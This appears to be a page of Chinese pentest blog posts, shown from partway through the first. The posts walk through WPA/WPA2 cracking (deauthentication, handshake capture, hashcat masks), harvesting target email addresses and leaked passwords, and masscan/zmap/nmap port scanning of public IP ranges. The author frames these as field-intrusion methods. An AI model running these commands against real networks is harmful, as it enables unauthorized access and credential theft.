<p>这里还是用我们自己的wifi来进行测试,选择1,至于之后的事情你就不用管了,它会自动帮你获取握手包文件并保存在当前路径下的hs目录中,如下:<br><img src="/img/crc.png" alt="自动获取握手包"><br><img src="/img/hs.png" alt="握手包位置"></p>
<p>0x04 具体的hash破解过程<br>&nbsp;&nbsp;&nbsp;&nbsp;最后,还是跟之前一样,直接处理下丢给hashcat或者aircrack都行,因为这里只是为了测试,所以就直接丢到aircrack中跑了,另外,有个需要注意的地方,如果你还是像之前那样直接用wpaclean处理,然后再丢给hashcat,破解速度会瞬间下降将近两万倍,其实,我也没搞懂这到底是为啥(懒得看代码,也没那个必要),所以,我个人还是推荐直接手工用aircrack相对比较靠谱,毕竟,越自动化的东西,往往对现实环境的适应力就越差,问题也就越多,不靠谱都是很正常的<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># aircrack-ng --bssid DC:EE:06:96:B7:B8  -w ../pass.txt klionsec_DC-EE-06-96-B7-B8.cap</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/ha.png" alt="握手包位置"><br></p>
<p>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;不可否认的是,脚本一定程度上确实很方便,但它同时显的很呆笨,里面的每个操作并非都是最适合我们的,对于渗透来讲,我们需要知道的往往是更细节的东西,自动化脚本对于还处在学习阶段的我们,并没什么实际的好处,因为它会严重阻碍你自己思考的习惯,总之,个人此脚本并不建议在实战中使用,除了破解时间的问题,实际测试的时候还有一些其它的小问题,还是那句话,建议直接手工aircrack,也许会更灵活点,不过,在kali nethunter中的表现还是不错的</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2015/04/15/aircrack-hascat/">
                aircrack & hashcat 非字典高速破解目标无线密码
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2015-04-15</span>
            
            
            
                <span class="category">
                    <a href="/categories/wpa-wpa2-crack/">wpa/wpa2 crack</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p>0x01 挂载好外置无线网卡<br>&nbsp;&nbsp;&nbsp;&nbsp;把用于抓包的无线网卡挂到kali中,正常情况下,网卡在成功载入系统后,应该是如下的效果,在虚拟机设置中选择’可移动设备’把你的网卡连到虚拟机里<br><img src="/img/1.png" alt="&quot;将网卡载入kali&quot;"><br>如下图可以看到系统已自动识别该网卡,并且已自动搜到附近的无线信号<br><img src="/img/2.png" alt="查看系统是否已经识别该网卡"><br><img src="/img/3.png" alt="看看能不能收到附近的无线信号"></p>
<p>0x02 检查无线网卡驱动是否能正常工作<br>&nbsp;&nbsp;&nbsp;&nbsp;紧接着,来看下当前系统中是否已经识别出该无线网卡的驱动,假设当前系统内核中已经有了该种无线网卡的驱动,它就会直接显示出当前无线网卡所使用的芯片组,可以看到,我这里用的是RT2800的芯片组(推荐大家直接去某宝买),如果没有,则可能需要你自己去手工编译安装相应的无线网卡驱动,然后再更新下内核模块即可(在linux中编译安装驱动着实是一件比较麻烦的事情,建议买的时候就直接去买aircrack所支持的网卡型号,起码用的时候不至于这么费劲,要相信万能的某宝),但这并不代表你只要把无线网卡驱动安装好就可以用了,需要搞清楚的是,你所使用的无线网卡芯片组必须要被aircrack所支持才可以,因为用无线网卡的最终目的还是用来捕获握手包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># airmon-ng  查看当前系统中的所有可用的无线网卡接口</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/4.png" alt="看看aircrack是否已经识别芯片组"><br></p>
<p>0x03 关于aircrack所支持的网卡芯片组列表,请自行参考aircrack官方说明:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.aircrack-ng.org/doku.php?id=compatibility_drivers</span><br></pre></td></tr></table></figure></p>
<p>0x04 为了保证aircrack套件在运行的时候不被其他进程所干扰,我们需要先执行以下命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># airmon-ng check kill</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/5.png" alt="aircrack启动检查"></p>
<p>0x05 可以看到,当前网卡默认还处在管理模式,这时我们需要手动将其变成监听模式,这样才能进行正常的抓包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># iwconfig  使用此命令可查看无线网卡的当前工作模式</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/6.png" alt="查看网卡工作模式"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># airmon-ng start wlan0   把网卡改为监听模式</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/7.png" alt="将网卡切换为监听模式"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># iwconfig  再次查看无线网卡工作模式是否真的已经改过来了</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/45.png" alt="看看网卡工作模式是否已经切换成功"></p>
<p>0x06<br>&nbsp;&nbsp;&nbsp;&nbsp;另外,你的无线网卡在启动监听模式以后,网卡接口名称就变成了wlan0mon,以后只要是在aircrack套件中需要指定网卡接口名称的,都要用这个名字,在老版本的aircrack中默认名称是mon0,而新版本则统一变成了wlan0mon,恩,一切准备就绪之后,我们开始尝试扫描附近的无线接入点,找个有客户端在线的再单独监听,一定要注意,”目标无线必须要有客户端在线”,否则是抓不到包的,这也是整个无线破解最核心的地方,因为我们要把对方的某个在线客户端蹬掉线,才能截获他的握手包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># airodump-ng wlan0mon 开始尝试扫描附近的无线信号,这里就用我们自己的wifi来进行测试,用于测试的wifi的mac和热点名称如下(klionsec)</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/8.png" alt="扫描附近的无线信号"></p>
<p>0x07<br>&nbsp;&nbsp;&nbsp;&nbsp;通过上面的扫描,我们选定了名称为”klionsec”的wpa2无线热点作为我们的攻击目标,这里我们需要先记录下目标无线的工作信道以及对应的mac,(后面单独监听时需要用到这些信息),而后,单独监听目标无线热点,注意这里在监听目标无线的过程中不要断开,直到整个抓包过程完成为止,接下来要做的事情就是等待客户端上线,然后进行抓包,例如,下面就表示有一个客户端在线,其实,抓握手包的原理就是先把这个在线的用户给蹬掉线,然后再截获它的握手包,而这个包里就有我们想要的无线密码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># airodump-ng --bssid DC:EE:06:96:B7:B8 -c 6 -w sec wlan0mon 监听目标无线,并把截获到的数据写到指定文件中</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/9.png" alt="单独监听目标无线"></p>
<p>0x08<br>&nbsp;&nbsp;&nbsp;&nbsp;发现客户端在线稳定后,就可以向目标发射’ddos’流量了,直到我们在监听的终端下看到有握手包出现为止,如果第一轮包发完成后,并没看到握手包,别着急,先等个几十秒,或者隔个五六秒再发一次即可,正常情况下,基本一次就能搞定<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># aireplay-ng --deauth 15 -a DC:EE:06:96:B7:B8 wlan0mon</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/10.png" alt="开始发动ddos攻击"></p>
<p>可以看到,这时握手包已被正常抓获,此时监听也就可以断开了,注意观察终端的右上角,那个带有<code>handshake</code>标志的就是握手包的意思<br><img src="/img/11.png" alt="成功获取握手包"></p>
<p>0x09<br>&nbsp;&nbsp;&nbsp;&nbsp;在我们抓获握手包以后,接下来的事情就非常简单了,你可以直接用aircrack加载弱口令字典进行爆破,当然,个人是十分不建议用字典(效率,实用性,太低,过于浪费时间),推荐大家直接把包处理一下丢给hashcat或者某宝去跑就行了,两种方法具体操作如下:</p>
<p>(1)第一种,利用aircrack加载字典进行爆破,反正我自己很少用,基本没用过,先不说速度如何,关键还是看你的字典是否靠谱,实际测试中,个人并不建议用,因为根本没有靠谱性可言,因为这里仅仅是测试,实际渗透中,哪有太多的时间让你去跑[比如,实地渗透]<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># aircrack-ng --bssid DC:EE:06:96:B7:B8 -w pass.txt sec-01.cap   会有三个文件,但最终的密码在cap文件</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/12.png" alt="破解握手包中的无线密码"></p>
<p>(2)第二种,直接利用hashcat跑hash,不过需要你事先稍微整理下数据包<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># wpaclean wpapass.cap sec-01.cap  	  可以看到这里已经成功识别出了目标无线id</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/13.png" alt="提取数据包中的hash"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># aircrack-ng wpapass.cap -J wpahash  把数据包转换成hashcat能认识的hash类型</span><br></pre></td></tr></table></figure></p>
<p><img src="/img/15.png" alt="转换成hashcat认识的hash格式"><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"># hashcat -m 2500 -a 3 wpahash.hccap ?u?l?l?l?l?d?d?d  因为我事先已经知道密码,所以直接这样给掩码会跑的更快一些</span><br></pre></td></tr></table></figure></p>
<p>下面是hashcat的破解结果,可以看到,像wpa这种加密算法,对于hashcat来讲,几乎是瞬间就被秒出来了,因为事先忘记了把wifi改的简单点(<code>汗……</code>),所以这里不得不拿之前的一个测试案例来说明了,因为这次用于测试的wifi密码比较复杂,要是硬破,估计明年也破不出来,所以没必要在这里浪费时间,重要的是把方法告诉大家就好,测试结果并不是最重要的,能把要说明的问题说清楚即可<br><img src="/img/hash.png" alt="破解结果"><br></p>
<p>0x10<br>&nbsp;&nbsp;&nbsp;&nbsp;至此,整个无线密码破解的经典步骤就算完成了,纵观全文,其实,并没多少技术含量在里面,跟着我的文档一步步的来,抓个包,跑个密码基本还是没什么问题的,其实,如果真的特别想关注底层的细节,不妨自己通过wireshark手工完成这一过程,可以明确告诉大家的是,这样是绝对可行的,请自行尝试<br><br><br>一点小结:<br>&nbsp;&nbsp;&nbsp;&nbsp;在破解无线密码的问题上,大家大可不用太过纠结,破密码的最终目的,也是希望能通过这种方式来在目标上开个口子,仅此而已,如果真的是哪天运气爆棚,直接捅到目标的办公网,自然是求之不得,因为毕竟是在实地,可能留给我们的时间也不会太多,还会有其它诸多的不便,想短时间内把整个内网摸透,可能也来不及,但想办法先在目标内网留个shell稳住入口,回去接着慢慢搞,还是可行的,一般对于从外部打进去非常难的情况下,这也许也是一种切实可行的渗透手段,祝大家好运吧,不过,最后,还是有句话不得不提醒大家,访问未授权的系统本身就是违法的,望大家洁身自好……!</p>

        </div>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2014/12/22/email-collector/">
                web渗透第一步之信息搜集 [快速抓取目标高质邮箱]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2014-12-22</span>
            
            
            
                <span class="category">
                    <a href="/categories/email-collect/">email collect</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>0x01 前期简单探测<br>&nbsp;&nbsp;&nbsp;&nbsp;首先,确定目标自己的邮件服务器所在的真实位置,一上来先别急着搜邮箱,不妨先看看邮件服务器自身有没有什么错误配置,比如,没有禁用VRFY或者EXPN命令导致的用户信息泄露,如果有,我们就可以直接通过这个把目标的邮件用户名都爆出来,如下,或者也可以尝试下弱口令之类的看能不能碰到一些,如果有,这就是最一手的发信邮箱<br><img src="/img/vrfy_config_error.png" alt=""><br><img src="/img/smtp_user_enum.png" alt=""></p>
<p>0x02 搜集目标的各类webmail入口<br>&nbsp;&nbsp;&nbsp;&nbsp;找目标的各种webmail入口,不一定有,这也是为了后面万一要撞到了密码还可以直接丢过来试试,另外,如果发现目标用的是某种开源web邮件程序,也可以尝试找找对应版本的exp,虽然不一定能成功,但好歹也是条路</p>
<p>0x03 提取whois邮箱<br>&nbsp;&nbsp;&nbsp;&nbsp;从域名的whois中获取目标域名的注册人,管理员,技术的邮箱,拿到这些邮箱之后,先尝试到各种公开搜索引擎及社交站点上去好好搜搜,说不定能抓到一些旧密码,最后,再到自己的社工库里去撞撞,也说不定真的就运气好呢<br><a href="https://www.tucowsdomains.com" target="_blank" rel="noopener">https://www.tucowsdomains.com</a><br><a href="https://www.domainz.net.nz/whois/" target="_blank" rel="noopener">https://www.domainz.net.nz/whois/</a><br>
        </div>
        <a href="/2014/12/22/email-collector/" class="read-more">Read More</a>
    

</div>
            
                
<div class="post">

    <div class="post-header index">
        <h1 class="title">
            <a href="/2014/12/21/port-hacking/">
                web渗透第一步之信息搜集  [ 端口渗透 ]
            </a>
        </h1>
        <div class="post-info">
            
                <span class="date">2014-12-21</span>
            
            
            
                <span class="category">
                    <a href="/categories/port-hacking/">port hacking</a>
                </span>
            
        </div>
    </div>

    
        <div class="content">
            <p><br><br>0x01  扫描前奏 </p>
<p>&nbsp;&nbsp;&nbsp;&nbsp;开始正式的说明之前,我们不妨先来简单了解下telnet,这也是到目前为止,个人认为最靠谱的tcp端口扫描工具,没有之一,如果你只是想快速地探测目标的某几个tcp端口是否开放,直接telnet一下,无疑是极好的,也根本犯不着一上来就搂着专业的端口扫描工具去一通乱扫,这样做可以有效避免因某些工具动静儿过大[如,nmap之流…],而造成一些不必要的麻烦,如,触发对方防护报警[后续再搞很可能就要换ip了,tor暂时也不是想象的那么好用],简单使用实例,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># telnet cc.target.edu.hk 1443</span></span><br><span class="line"><span class="comment"># telnet cc.target.edu.hk 3389</span></span><br><span class="line"><span class="comment"># telnet cc.target.edu.hk 22</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>0x02  关于端口扫描工具<br>&nbsp;&nbsp;&nbsp;&nbsp;除了用telnet对某单个机器进行快速常规高危端口探测之外,如果我们想短时间内对多个目标进行批量端口扫描,又该怎么办呢,这里就简单介绍下几款经常会用到的公网端口扫描工具,masscan和zmap,同是基于无状态的的端口扫描,这里顺便科普下什么是无状态,简单来说,普通的端口扫描工具,在发出请求包以后还有一个等待数据回应的过程,然后根据回应的数据包头标志(不同系统平台的协议栈对每种标志的数据包响应状态也是不一样的)以此来判断目标的某个端口或者服务是否开放,用的什么操作系统等等……但这样做,无疑会很大程度上拖慢扫描速度,所以,后来大牛们就搞出了无状态扫描,这也就意味着,当请求包发送以后就被不再管了,也不再等待回应,所有的验证都放在数据包本身,这可能也是它快的主要原因,另外,此类工具为了减少触发目标ids的几率,都采用了分组扫描算法[这种东西其实并不算新奇],让扫描的ip随机分布[尽可能规避目标防护],而不是密麻集中在某个点……好了,简单科普就先到这里,过深的东西,也不是我目前的能力所能企及的,关键我们能把工具用起来就行,接着就来分别介绍下两款工具的一些常规用法,实际渗透中,个人还是更推荐masscan…原因我这里不多嘴了,还是留给大家,自行慢慢体会吧</p>
<p>0x03 masscan [扫描速度取决于你的实际带宽,默认只扫描tcp端口,但也可扫udp]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">https:</span>/<span class="regexp">/github.com/robertdavidgraham</span><span class="regexp">/masscan</span></span><br></pre></td></tr></table></figure></p>
<p>masscan 常用选项:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-p 		指定要扫描的端口,同时指定多个端口要用逗号隔开</span><br><span class="line">--rate  	指定发包速率,根据你自己的实际带宽来定,我自己是<span class="number">20</span>M的光纤,一般给<span class="number">1000</span>足矣,一两兆的vpn,给<span class="number">100</span>就差不多了,都是粗略估计的,懒的算</span><br><span class="line">--open-only 	仅显示开放的端口 </span><br><span class="line">--banners 	获取banners</span><br><span class="line">-c      	使用自定义的扫描配置文件</span><br><span class="line">--ping  	扫之前是否要先ping下目标</span><br><span class="line">-oL     	把扫描结果存到指定文件中</span><br><span class="line">--excludefile   排除不扫描的ip段</span><br></pre></td></tr></table></figure></p>
<p>masscan 配置文件格式,如下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># klion masscan config  '#'表注释</span></span><br><span class="line">rate =<span class="number">1000.00</span>       	<span class="comment"># 指定发包速率,根据自己的实际带宽计算</span></span><br><span class="line">output-format=list 	<span class="comment"># 指定扫描结果保存的文件格式,这里我就用最普通的文本存,当然,它是支持直接输出成xml格式的,后续方便用程序处理</span></span><br><span class="line">output-filename=<span class="regexp">/root/</span>Desktop/port_hacking.txt 	<span class="comment"># 指定要把扫描的结果文件保存到哪里</span></span><br><span class="line">output-status=open 	<span class="comment"># 只保留开放的端口信息</span></span><br><span class="line">ports=<span class="number">80</span>,<span class="number">443</span>,<span class="number">8080</span>,<span class="symbol">U:</span><span class="number">53</span>  <span class="comment"># 指定要扫描的端口,默认tcp,当然,你也可以指定UDP的端口,U即udp </span></span><br><span class="line">range=<span class="number">203.174</span>.<span class="number">48.0</span>/<span class="number">24</span>   <span class="comment"># 指定要扫描的ip段,可以连续指定多个,中间记得逗号隔开就好了</span></span><br><span class="line">ping=<span class="literal">false</span>              <span class="comment"># 扫描的时候要不要先ping下,true表示真,即ping</span></span><br><span class="line">banners=<span class="literal">true</span>		<span class="comment"># 获取端口banner信息</span></span><br><span class="line">excludefile=<span class="regexp">/etc/zmap</span><span class="regexp">/blacklist.conf	# 指定不扫描的ip段,可以把不想扫描的一些ip段都加到这个文件中,如:内网ip段是不需要扫的</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/masscan config.png" alt=""></p>
<p>masscan 实例用法[支持同时进行tcp及udp扫描]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">手工指定选项扫描</span><br><span class="line"><span class="comment"># masscan --rate=1000 -p21,22,23,25,U:69,110,143,U:161,80,81,82,83,88,443,445,512,513,514,1433,1521,2082,2083,2181,2601,2604,3128,3690,4848,8088,8086,8081,8080,3306,5432,3389,5984,6379,7001,7002,8069,9200,9300,11211,10000,27017,27018,50000,50070,50030 --banners 202.181.132.0/24 103.15.135.0/24 203.174.48.0/24 203.124.10.0/24 202.65.218.0/24 202.181.196.0/24 -oL port_hacking.txt</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/masscan manual.png" alt=""></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">直接加载自定义配置文件进行扫描</span><br><span class="line"><span class="comment"># masscan -c masscan.conf</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/masscan config res.png" alt=""></p>
<p>一句话快速锁定各类敏感服务特征:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># cat port_hacking.txt | egrep "ProFTPD|vsFTPd|FileZilla Server|Microsoft FTP Service|Pure-FTPd|OpenSSH|Remote Management Console|User Access Verification|Welcome to the server management|imap|smtp|pop|snmp"</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/masscan manual ftp.png" alt=""><br></p>
<p>0x04 zmap [扫描速度依然是取决于你的实际带宽,不过,在实际测试中准确率要比masscan稍差,同样的目标,masscan能扫出来,zmap却扫不出来,内部具体原因,暂未深究]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其官方站点: <span class="symbol">https:</span>/<span class="regexp">/zmap.io</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">zmap常用选项 [选项作用其实跟masscan差不太多,只不过zmap默认是tcp模式扫描,如果要用其它的协议扫描就必须自己单独用选项指定]<span class="symbol">:</span></span><br><span class="line">[注意<span class="symbol">:</span>如果你要手工指定扫描选项,就务必先把zmap.conf文件中的所有选项都注释掉,不然会出错,原因暂未知,貌似它默认应该会先读取这个文件,一般我都是直接把它默认的配置文件选项全部注释掉,直接手工指定扫描选项]<span class="symbol">:</span></span><br><span class="line">-p  指定要扫描的端口</span><br><span class="line">-b  指定扫描ip黑名单,如,内网ip,我们是不需要扫的</span><br><span class="line">-o  保存扫描结果到指定的文件中</span><br><span class="line">-w  可以把要扫描的ip段事先都放在一个文件中,进行批量扫描,注意格式,一行对应一个ip段</span><br><span class="line">-r  指定扫描发包速率</span><br><span class="line">-B  指定你的实际带宽,比如你带宽<span class="number">10</span>M,实际指定<span class="number">4</span>-<span class="number">6</span>M即可</span><br><span class="line">-C  也可以直接加载自定义配置文件进行扫描</span><br><span class="line">-s  在扫描完成后进行简单汇总</span><br><span class="line">--probe-module=icmp_echoscan   	icmp模式扫描</span><br><span class="line">--probe-module=udp   		udp模式扫描</span><br></pre></td></tr></table></figure>
<p>zmap 扫描配置文件格式说明:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">interface <span class="string">"eth0"</span>   		<span class="comment"># 指定用于扫描的网卡接口</span></span><br><span class="line">probe-<span class="class"><span class="keyword">module</span> <span class="title">tcp_synscan</span>	<span class="comment"># 扫描模式,默认是是tcp的syn</span></span></span><br><span class="line">target-port <span class="number">3389</span>		<span class="comment"># 要扫描的端口,不知道为什么在配置文件中不能同时指定多个,难道是我格式写错了,回头抽空再好好看看帮助</span></span><br><span class="line">rate <span class="number">100</span>			<span class="comment"># 设置发包速率</span></span><br><span class="line">bandwidth <span class="number">1</span>M			<span class="comment"># 设置带宽</span></span><br><span class="line">blacklist-file <span class="string">"/etc/zmap/blacklist.conf"</span>	<span class="comment"># 指定扫描黑名单ip段[如,内网ip,特殊ip,所有你不想扫描的ip...]</span></span><br><span class="line">output-file <span class="string">"/root/Desktop/port_res.txt"</span>	<span class="comment"># 指定扫描结果的存放位置</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/zmap config.png" alt=""><br></p>
<p>zmap 常规用法 [ 支持tcp,udp,icmp模式扫描,最好不要挂vpn扫,原因暂未知,即使加上–vpn貌似也不太好使 ]:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># zmap -B 1M  -p [21,22,23,25,110,143,80,81,82,83,88,443,445,512,513,514,1433,1521,2082,2083,2181,2601,2604,3128,3690,4848,8088,8086,8081,8080,3306,5432,3389,5984,6379,7001,7002,8069,9200,9300,11211,10000,27017,27018,50000,50070,50030] -b /etc/zmap/blacklist.conf -r 1000 202.181.132.0/24 -o Desktop/port_res.txt</span></span><br></pre></td></tr></table></figure></p>
<p><img src="/img/zmap mausal.png" alt=""><br></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># zmap -C /etc/zmap/zmap.conf 202.181.132.0/24  加载自定配置文件进行扫描</span></span><br></pre></td></tr></table></figure>
<p><img src="/img/zmap config res.png" alt=""><br></p>
<p>0x05 在用上面两款工具时,有些地方还是需要注意下:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">实际使用中,最好先根据你的实际带宽估算下最合适的发包速率,因为你的带宽和发包的速率会直接影响扫描结果的准确性</span><br><span class="line">像这类的工具一般对带宽和速率的控制要求比较高,还有,在扫描之前它会预先提示你要扫描多少台机器,机器的多少也是根据你所给的掩码自动算出来的</span><br><span class="line">扫完以后,先随便telnet几个ip的端口,看看精度如何,务必不要过度的依赖这些工具扫出来的结果</span><br><span class="line">不单单是针对这两款工具,对所有工具都是如此,理解作者的实际编写思路比使用工具本身更重要,因为这是灵活运用的前提</span><br><span class="line">即使你暂时还写不出来很优秀的代码,但总有一天你会写出来的,先把自己的基础打好</span><br><span class="line">假如以后你想在这方面继续深入,这些都是很优秀的学习样板,所以过硬的编码能力在任何时候都跑不掉,贵在坚持嘛</span><br></pre></td></tr></table></figure></p>
<p>0x06 最后再来看下老旧的 nmap,作为一款家喻户晓的探测工具,想必大家对它早已经非常熟悉 [一直为人诟病的是老版本速度非常慢,可能是发包然后等待验证的过程比较复杂吧,不过,新版本确实已经改进不少],一般在linux目标机器中稍微懂一些的运维都会把这个预先装上,这样反而极大的方便了我们:<br><figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -v 192.168.3.240  扫描某单个目标[目标可以是域名,ip后者ip段]</span></span><br></pre></td></tr></table></figure></p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -iL ip.txt  	同时扫描多个目标,把目标的ip/ip段事先放在一个文件中,每行对应一个</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -Pn 192.168.3.240  	扫描前先不要ping</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -sV -v 192.168.3.240  探测远程机器上详细的服务信息,如,详细的名称版本,有banner的可能直接就把banner获取过来了,没banner的可能就慢慢的匹配特征,耗时会相对较长</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -O -v 192.168.3.240   探测远程操作系统平台,如内核名称,版本...</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">扫描自己指定的端口,默认如果你不指定端口,它会自动扫描事先写死在程序中的<span class="number">1000</span>个高危端口</span><br><span class="line"><span class="comment"># nmap -p 80,81,82,83,84,1433  192.168.3.189</span></span><br><span class="line"><span class="comment"># nmap -p U:53,111,137,T:21-25,80,139,8080 192.168.3.189</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">全面扫描目标主机的所有信息,包括操作系统,端口,服务,相当于-O -sV 的总和……</span><br><span class="line"><span class="comment"># nmap -A  -v 192.168.3.240</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">快速扫描整个C段,速度级别从<span class="number">0</span>到<span class="number">5</span>,默认用icmp请求,极易被防火墙阻拦</span><br><span class="line"><span class="comment"># nmap -T5 -v 192.168.3.240</span></span><br><span class="line"><span class="comment"># nmap -T5 -v 192.168.3.0/24</span></span><br><span class="line"><span class="comment"># nmap -T5 --open 192.168.3.0/24</span></span><br><span class="line"><span class="comment"># nmap -v  192.168.3.1-10</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap --packet-trace  192.168.3.0/24  观察扫描时的详细发包过程</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># nmap -sU 192.168.3.240  所谓隐蔽的UDP扫描,其实并不隐蔽</span></span><br></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">几种常用的扫描方式,tcp的syn和ack扫描另外还有connect(推荐用这个)</span><br><span class="line"><span class="comment"># nmap -sT 192.168.3.240  个人推荐的扫描方式</span></span><br><span class="line"><span class="comment"># nmap -sS 192.168.3.240</span></span><br><span class="line"><span class="comment"># nmap -sA 192.168.3.240</span></span><br></pre></td></tr></table></figure>
